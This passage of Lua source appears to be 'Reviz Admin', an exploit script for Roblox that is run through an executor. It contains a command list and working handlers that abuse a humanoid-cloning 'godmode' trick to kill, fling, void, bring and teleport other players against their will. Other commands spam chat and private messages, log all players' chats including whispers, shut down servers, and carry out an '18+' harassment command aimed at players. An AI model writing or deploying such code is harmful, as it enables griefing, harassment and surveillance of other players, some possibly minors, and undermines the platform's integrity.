	'[79] animgui -- Loads up Energize animations GUI',
	'[80] savepos -- Saves your current position',
	'[81] loadpos -- Teleports you to your saved position',
	'[82] bang [plr] -- 18+ will not work if you have FE Godmode on',
	'[83] unbang',
	'[84] delcmdbar -- Removes the command bar completely',
	'[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model',
	'[86] shutdown -- Uses harkinians script to shutdown server',
	'[87] respawn -- If grespawn doesnt work you can use respawn',
	'[88] delobj [obj] -- Deletes a certain brick in workspace, client sided',
	'[89] getplrs -- Prints all players in game',
	'[90] deldecal -- Deletes all decals client sided',
	'[91] opfinality -- Loads in my FE GUI Opfinality',
	'[92] remotes -- Prints all remotes in the game in the console when added',
	'[93] noremotes -- Stops printing remotes',
	'[94] tpdefault -- Stops all loop teleports to a player',
	'[95] stopsit -- Will not allow you to sit',
	'[96] gosit -- Allows you to sit',
	'[97] clicktp -- Enables click tp',
	'[98] noclicktp -- Disables click tp',
	'[99] toolson -- If any tools are dropped in the workspace you will automatically get them',
	'[100] toolsoff -- Stops ;toolson',
	'[101] version -- Gets the admin version',
	'[102] state [num] -- Changes your humanoid state, ;unstate to stop.',
	'[103] gravity [num] -- Changes workspace gravity default is 196.2',
	'[104] pgs -- Checks if the game has PGSPhysicsSolverEnabled enabled',
	'[105] clickdel -- Delete any block you press q on, client sided',
	'[106] noclickdel -- Stops clickdel',
	'[107] looprhats -- Loop removes mesh of your hats/loop block hats',
	'[108] unlooprhats -- Stops loop removing mesh',
	'[109] looprtool -- Loop removes mesh of your tool/loop block tools',
	'[110] unlooprtool -- Stops loop removing mesh',
	'[111] givealltools [plr] -- Gives all the tools you have in your backpack to the player',
	'[112] age [plr] -- Makes you chat the account age of the player',
	'[113] id [plr] -- Makes you chat the account ID of the player',
	'[114] .age [plr] -- Privately shows you the account age of the player',
	'[115] .id [plr] -- Privately shows you the account ID of the player',
	'[116] gameid -- Shows the game ID',
	'[117] removeinvis -- Removes all invisible walls/parts, client sided',
	'[118] removefog -- Removes fog, client sided',
	'[119] disable -- Disables your character by removing humanoid',
	'[120] enable -- Enables your character by adding humanoid',
	'[121] prefix [key] -- Changes the prefix used, default is ;',
	'[122] ;resetprefix -- Resets the prefix to ; incase you change it to an unusable prefix. Say exactly ";resetprefix" to do this command, no matter what your prefix is set to.',
	'[123] flyspeed [num] -- Change your fly speed, default is 1',
	'[124] carpet [plr] -- Makes you a carpet for a player, will not work if FE Godmode is on',
	'[125] uncarpet -- Stops carpet player',
	'[126] stare [plr] -- Turns your character to stare at another player',
	'[127] unstare -- Stops stare player',
	'[128] logchat -- Logs all chat (including /e and whispers) of all players',
	'[129] unlogchat -- Disables logchat',
	'[130] fixcam -- Fixes/resets your camera',
	'[131] unstate -- Stops changing state',
}
speedget = 1

lplayer = game:GetService("Players").LocalPlayer

lplayer.CharacterAdded:Connect(function(character)
	spin = false
	flying = false
	staring = false
	banpl = false
end)

function change()
	prefix = prefix
	speedfly = speedfly
end

function GetPlayer(String) -- Credit to Timeless/xFunnieuss
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            table.insert(Found,v)
        end
    elseif strl == "others" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                table.insert(Found,v)
            end
        end   
	elseif strl == "me" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name == lplayer.Name then
                table.insert(Found,v)
            end
        end  
    else
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end    
    end
    return Found    
end

local Mouse = lplayer:GetMouse()

spin = false
followed = false
traill = false
noclip = false
annoying = false
hwalk = false
droppinghats = false
droppingtools = false
flying = false
spamdelay = 1
spamming = false
spammingpm = false
cbringing = false
remotes = true
added = true
binds = false
stopsitting = false
clickgoto = false
gettingtools = false
removingmeshhats = false
removingmeshtool = false
clickdel = false
staring = false
chatlogs = false
banpl = false
changingstate = false
statechosen = 0

adminversion = "Reviz Admin by illremember, Version 2.0"

flying = false
speedfly = 1

function plrchat(plr, chat)
print(plr.Name..": "..tick().."\n"..chat)
end

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
v.Chatted:connect(function(chat)
if chatlogs then
plrchat(v, chat)
end
end)
end
game:GetService("Players").PlayerAdded:connect(function(plr)
plr.Chatted:connect(function(chat)
if chatlogs then
plrchat(plr, chat)
end
end)
end)


local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local CMDBAR = Instance.new("TextBox")
ScreenGui.Parent = game:GetService("CoreGui")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0.3, 0.1, 0.1)
Frame.BackgroundTransparency = 0.3
Frame.Position = UDim2.new(0.5, 0, 0, 10)
Frame.Size = UDim2.new(0, 200, 0, 40)
Frame.Active = true
Frame.Draggable = true
CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = Frame
CMDBAR.BackgroundColor3 = Color3.new(0.105882, 0.164706, 0.207843)
CMDBAR.BackgroundTransparency = 0.20000000298023
CMDBAR.Size = UDim2.new(0, 180, 0, 20)
CMDBAR.Position = UDim2.new(0.05, 0, 0.25, 0)
CMDBAR.Font = Enum.Font.SourceSansLight
CMDBAR.FontSize = Enum.FontSize.Size14
CMDBAR.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
CMDBAR.TextScaled = true
CMDBAR.TextSize = 14
CMDBAR.TextWrapped = true
CMDBAR.Text = "Press ; to type, Enter to execute"

local CMDS = Instance.new("ScreenGui")
local CMDSFRAME = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel = Instance.new("TextLabel")
local closegui = Instance.new("TextButton")
CMDS.Name = "CMDS"
CMDS.Parent = game:GetService("CoreGui")
CMDSFRAME.Name = "CMDSFRAME"
CMDSFRAME.Parent = CMDS
CMDSFRAME.Active = true
CMDSFRAME.BackgroundColor3 = Color3.new(0.223529, 0.231373, 0.309804)
CMDSFRAME.BorderSizePixel = 0
CMDSFRAME.Draggable = true
CMDSFRAME.Position = UDim2.new(0, 315, 0, 100)
CMDSFRAME.Size = UDim2.new(0, 275, 0, 275)
CMDSFRAME.Visible = false
ScrollingFrame.Parent = CMDSFRAME
ScrollingFrame.BackgroundColor3 = Color3.new(0.160784, 0.160784, 0.203922)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.0729999989, 0)
ScrollingFrame.Size = UDim2.new(1.04999995, 0, 0.92900002, 0)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
TextLabel.Parent = ScrollingFrame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Size = UDim2.new(0.930000007, 0, 1, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.FontSize = Enum.FontSize.Size18
TextLabel.Text = "[-] cmdbar is shown when ; is pressed.,\n[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player,\n[2] bring [plr] -- You need a tool! Will bring player to you,\n[3] spin [plr] -- You need a tool! Makes you and the player spin crazy,\n[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting,\n[5] attach [plr] -- You need a tool! Attaches you to player,\n[6] unattach [plr] -- Attempts to unattach you from a player,\n[7] follow [plr] -- Makes you follow behind the player,\n[8] unfollow,\n[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air,\n[10] trail [plr] -- The opposite of follow, you stay infront of player,\n[11] untrail,\n[12] orbit [plr] -- Makes you orbit the player,\n[13] unorbit,\n[14] fling [plr] -- Makes you fling the player,\n[15] unfling,\n[16] fecheck -- Checks if the game is FE or not,\n[17] void [plr] -- Teleports player to the void,\n[18] noclip -- Gives you noclip to walk through walls,\n[19] clip -- Removes noclip,\n[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default,\n[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default,\n[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default,\n[23] default -- Changes your speed, jumppower and hipheight to default values,\n[24] annoy [plr] -- Loop teleports you to the player,\n[25] unannoy,\n[26] headwalk [plr] -- Loop teleports you to the player head,\n[27] unheadwalk,\n[28] nolimbs -- Removes your arms and legs,\n[29] god -- Gives you FE Godmode,\n[30] drophats -- Drops your accessories,\n[31] droptool -- Drops any tool you have equipped,\n[32] loopdhats -- Loop drops your accessories,\n[33] unloopdhats,\n[34] loopdtool -- Loop drops any tools you have equipped,\n[35] unloopdtool,\n[36] invisible -- Gives you invisibility CREDIT TO TIMELESS,\n[37] view [plr] -- Changes your camera to the player character,\n[38] unview,\n[39] goto [plr] -- Teleports you to player,\n[40] fly -- Allows you to fly,\n[41] unfly,\n[42] chat [msg] -- Makes you chat a message,\n[43] spam [msg] -- Spams a message,\n[44] unspam,\n[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second,\n[46] pmspam [plr] -- Spams a player in private message,\n[47] unpmspam,\n[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you,\n[49] uncfreeze [plr],\n[50] unlockws -- Unlocks the workspace,\n[51] lockws -- Locks the workspace,\n[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you,\n[53] pstand -- Enables platform stand,\n[54] unpstand -- Disables platform stand,\n[55] blockhead -- Removes your head mesh,\n[56] sit,\n[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name,\n[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided,\n[59] hypertotal -- Loads in my FE GUI Hypertotal,\n[60] cmds -- Prints all commands,\n[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats,\n[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool,\n[63] spinner -- Makes you spin,\n[64] nospinner,\n[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom,\n[66] noreach -- Removes reach, must have tool equipped,\n[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying,\n[68] tp me [plr] -- Alternative to goto,\n[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player,\n[70] uncbring,\n[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players,\n[72] givetool [plr] -- Gives the tool you have equipped to the player,\n[73] glitch [plr] -- Glitches you and the player, looks very cool,\n[74] unglitch -- Unglitches you,\n[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode,\n[76] explorer -- Loads up DEX,\n[77] reset -- Resets your character.,\n[78] anim [id] -- Applies an animation on you, must be created by ROBLOX,\n[79] animgui -- Loads up Energize animations GUI,\n[80] savepos -- Saves your current position,\n[81] loadpos -- Teleports you to your saved position,\n[82] bang [plr] -- 18+,\n[83] unbang,\n[84] delcmdbar -- Removes the command bar completely,\n[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model,\n[86] shutdown -- Uses harkinians script to shutdown server,\n[87] respawn -- If grespawn doesnt work you can use respawn,\n[88] delobj [obj] -- Deletes a certain brick in workspace, client sided,\n[89] getplrs -- Prints all players in game,\n[90] deldecal -- Deletes all decals client sided,\n[91] opfinality -- Loads in my FE GUI Opfinality,\n[92] remotes -- Prints all remotes in the game in the console when added,\n[93] noremotes -- Stops printing remotes,\n[94] tpdefault -- Stops all loop teleports to a player,\n[95] stopsit -- Will not allow you to sit,\n[96] gosit -- Allows you to sit,\n[97] clicktp -- Enables click tp,\n[98] noclicktp -- Disables click tp,\n[99] toolson -- If any tools are dropped in the workspace you will automatically get them,\n[100] toolsoff -- Stops ;toolson,\n[101] version -- Gets the admin version, \n This list of commands is NOT showing everything, go to my thread in the pastebin link to see ALL commands."
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 15
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextYAlignment = Enum.TextYAlignment.Top
closegui.Name = "closegui"
closegui.Parent = CMDSFRAME
closegui.BackgroundColor3 = Color3.new(0.890196, 0.223529, 0.0588235)
closegui.BorderSizePixel = 0
closegui.Position = UDim2.new(0.995000005, 0, 0, 0)
closegui.Size = UDim2.new(0.0545952693, 0, 0.0728644878, 0)
closegui.Font = Enum.Font.SourceSansBold
closegui.FontSize = Enum.FontSize.Size24
closegui.Text = "X"
closegui.TextColor3 = Color3.new(1, 1, 1)
closegui.TextSize = 20

closegui.MouseButton1Click:connect(function()
	CMDSFRAME.Visible = false
end)

game:GetService('RunService').Stepped:connect(function()
	if spin then
		lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[spinplr.Name].Character.HumanoidRootPart.CFrame
	end
	if followed then
		lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * -5
	end
	if traill then
		lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * 5
	end
	if annoying then
		lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[annplr.Name].Character.HumanoidRootPart.CFrame
	end
	if hwalk then
		lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[hdwplr.Name].Character.HumanoidRootPart.CFrame + Vector3.new(0, 4, 0)
	end
	if staring then
		lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(lplayer.Character.Torso.Position, game:GetService("Players")[stareplr.Name].Character.Torso.Position)
	end
end)
game:GetService('RunService').Stepped:connect(function()
	if noclip then
		if lplayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
			lplayer.Character.Head.CanCollide = false
			lplayer.Character.Torso.CanCollide = false
			lplayer.Character["Left Leg"].CanCollide = false
			lplayer.Character["Right Leg"].CanCollide = false
		else
			lplayer.Character.Humanoid:ChangeState(11)
		end
	end
	if changingstate then
		lplayer.Character.Humanoid:ChangeState(statechosen)
	end
end)
game:GetService('RunService').Stepped:connect(function()
	if droppinghats then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Accessory")) or (v:IsA("Hat")) then
				v.Parent = workspace
			end
		end
	end
	if droppingtools then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Tool")) then
				v.Parent = workspace
			end
		end
	end
	if removingmeshhats then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Accessory")) or (v:IsA("Hat")) then
				v.Handle.Mesh:Destroy()
			end
		end
	end
	if removingmeshtool then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Tool")) then
				v.Handle.Mesh:Destroy()
			end
		end
	end
end)
game:GetService('RunService').Stepped:connect(function()
	if banpl then
		lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[bplrr].Character.HumanoidRootPart.CFrame
	end
end)
game:GetService('RunService').Stepped:connect(function()
	if stopsitting then
		lplayer.Character.Humanoid.Sit = false
	end
end)

plr = lplayer 
hum = plr.Character.HumanoidRootPart
mouse = plr:GetMouse() 
mouse.KeyDown:connect(function(key) 
	if key == "e" then 
		if mouse.Target then 
			if clickgoto then
				hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
			elseif clickdel then
				mouse.Target:Destroy()
			end
		end 
	end
end)

game:GetService("Workspace").ChildAdded:connect(function(part)
	if gettingtools then
		if part:IsA("Tool") then
			part.Handle.CFrame = lplayer.Character.HumanoidRootPart.CFrame
		end
	end
end)

lplayer.Chatted:Connect(function(msg)
	if string.sub(msg, 1, 6) == (prefix.."kill ") then
		if string.sub(msg, 7) == "me" then
			lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
		else
			for i,v in pairs(GetPlayer(string.sub(msg, 7)))do
				local NOW = lplayer.Character.HumanoidRootPart.CFrame
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				local function tp(player,player2)
				local char1,char2=player.Character,player2.Character
				if char1 and char2 then
				char1:MoveTo(char2.Head.Position)
				end
				end
				wait(0.1)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.5)
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
				wait(0.7)
				tp(lplayer,game:GetService("Players")[v.Name])
				wait(0.7)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."bring ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
			local NOW = lplayer.Character.HumanoidRootPart.CFrame
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			lplayer.Character.Humanoid:EquipTool(v)
			end
			local function tp(player,player2)
			local char1,char2=player.Character,player2.Character
			if char1 and char2 then
			char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
			end
			end
			local function getout(player,player2)
			local char1,char2=player.Character,player2.Character
			if char1 and char2 then
			char1:MoveTo(char2.Head.Position)
			end
			end
			tp(game:GetService("Players")[v.Name], lplayer)
			wait(0.2)
			tp(game:GetService("Players")[v.Name], lplayer)
			wait(0.5)
			lplayer.Character.HumanoidRootPart.CFrame = NOW
			wait(0.5)
			getout(lplayer, game:GetService("Players")[v.Name])
			wait(0.3)
			lplayer.Character.HumanoidRootPart.CFrame = NOW
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools needed!";
			Text = "You need a tool in your backpack for this command!";
			})
		end
	end
	if string.sub(msg, 1, 6) == (prefix.."spin ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			lplayer.Character.Animate.Disabled = false
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			lplayer.Character.Humanoid:EquipTool(v)
			end
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
			spinplr = v
			wait(0.5)
			spin = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools needed!";
			Text = "You need a tool in your backpack for this command!";
			})
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."unspin") then
		spin = false
	end
	if string.sub(msg, 1, 8) == (prefix.."attach ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			lplayer.Character.Humanoid:EquipTool(v)
			end
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
			wait(0.3)
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
			attplr = v
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools needed!";
			Text = "You need a tool in your backpack for this command!";
			})
		end
	end
	if string.sub(msg, 1, 10) == (prefix.."unattach ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
			local function getout(player,player2)
			local char1,char2=player.Character,player2.Character
			if char1 and char2 then
			char1:MoveTo(char2.Head.Position)
			end
			end
			getout(lplayer, game:GetService("Players")[v.Name])
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."follow ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
			followed = true
			flwplr = v
		end
	end
	if string.sub(msg, 1, 9) == (prefix.."unfollow") then
		followed = false
	end
	if string.sub(msg, 1, 10) == (prefix.."freefall ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
			local NOW = lplayer.Character.HumanoidRootPart.CFrame
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			lplayer.Character.Humanoid:EquipTool(v)
			end
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			wait(0.2)
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			wait(0.6)
			lplayer.Character.HumanoidRootPart.CFrame = NOW
			wait(0.6)
			lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools needed!";
			Text = "You need a tool in your backpack for this command!";
			})
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."trail ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
			traill = true
			trlplr = v
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."untrail") then
		traill = false
	end
	if string.sub(msg, 1, 7) == (prefix.."orbit ") then
		if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
			lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
		else
			for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
				local o = Instance.new("RocketPropulsion")
				o.Parent = lplayer.Character.HumanoidRootPart
				o.Name = "Orbit"
				o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
				o:Fire()
				noclip = true
			end
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."unorbit") then
		lplayer.Character.HumanoidRootPart.Orbit:Destroy()
		noclip = false
	end
	if string.sub(msg, 1, 7) == (prefix.."fling ") then
		if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
			lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
		else
			for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
				local y = Instance.new("RocketPropulsion")
				y.Parent = lplayer.Character.HumanoidRootPart
				y.CartoonFactor = 1
				y.MaxThrust = 800000
				y.MaxSpeed = 1000
				y.ThrustP = 200000
				y.Name = "Fling"
				game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
				y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
				y:Fire()
				noclip = true
			end
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."unfling") then
		noclip = false
		lplayer.Character.HumanoidRootPart.Fling:Destroy()
		game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
		wait(0.4)
		lplayer.Character.HumanoidRootPart.Fling:Destroy()
	end
	if string.sub(msg, 1, 8) == (prefix.."fecheck") then
		if game:GetService("Workspace").FilteringEnabled == true then
			warn("FE is Enabled (Filtering Enabled)")
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "FE is Enabled";
				Text = "Filtering Enabled. Enjoy using Reviz Admin!";
			})
		else
			warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "FE is Disabled";
				Text = "Filtering Disabled. Consider using a different admin script.";
			})
		end
	end
	if string.sub(msg, 1, 6) == (prefix.."void ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			lplayer.Character.Humanoid:EquipTool(v)
			end
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			wait(0.2)
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			wait(0.6)
			lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools needed!";
			Text = "You need a tool in your backpack for this command!";
			})
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."noclip") then
		noclip = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Noclip enabled";
		Text = "Type ;clip to disable";
		})
	end
	if string.sub(msg, 1, 5) == (prefix.."clip") then
		noclip = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Noclip disabled";
		Text = "Type ;noclip to enable";
		})
	end
	if string.sub(msg, 1, 7) == (prefix.."speed ") then
		lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 8))
	end
	if string.sub(msg, 1, 4) == (prefix.."ws ") then
		lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 5))
	end
	if string.sub(msg, 1, 11) == (prefix.."hipheight ") then
		lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 12))
	end
	if string.sub(msg, 1, 4) == (prefix.."hh ") then
		lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 5))
	end
	if string.sub(msg, 1, 11) == (prefix.."jumppower ") then
		lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 12))
	end
	if string.sub(msg, 1, 4) == (prefix.."jp ") then
		lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 5))
	end
	if string.sub(msg, 1, 8) == (prefix.."default") then
		lplayer.Character.Humanoid.JumpPower = 50
		lplayer.Character.Humanoid.WalkSpeed = 16
		lplayer.Character.Humanoid.HipHeight = 0
	end
	if string.sub(msg, 1, 7) == (prefix.."annoy ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
			annoying = true
			annplr = v
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."unannoy") then
		annoying = false
	end
	if string.sub(msg, 1, 10) == (prefix.."headwalk ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
			hwalk = true
			hdwplr = v
		end
	end
	if string.sub(msg, 1, 11) == (prefix.."unheadwalk") then
		hwalk = false
	end
	if string.sub(msg, 1, 8) == (prefix.."nolimbs") then
		lplayer.Character["Left Leg"]:Destroy()
		lplayer.Character["Left Arm"]:Destroy()
		lplayer.Character["Right Leg"]:Destroy()
		lplayer.Character["Right Arm"]:Destroy()
	end
	if string.sub(msg, 1, 4) == (prefix.."god") then
		lplayer.Character.Humanoid.Name = 1
		local l = lplayer.Character["1"]:Clone()
		l.Parent = lplayer.Character
		l.Name = "Humanoid"
		wait(0.1)
		lplayer.Character["1"]:Destroy()
		game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
		lplayer.Character.Animate.Disabled = true
		wait(0.1)
		lplayer.Character.Animate.Disabled = false
		lplayer.Character.Humanoid.DisplayDistanceType = "None"
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "FE Godmode enabled";
		Text = "Use ;grespawn or ;respawn to remove";
		})
	end
	if string.sub(msg, 1, 9) == (prefix.."drophats") then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Accessory")) or (v:IsA("Hat")) then
				v.Parent = workspace
			end
		end
	end
	if string.sub(msg, 1, 9) == (prefix.."droptool") then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Tool")) then
				v.Parent = workspace
			end
		end
	end
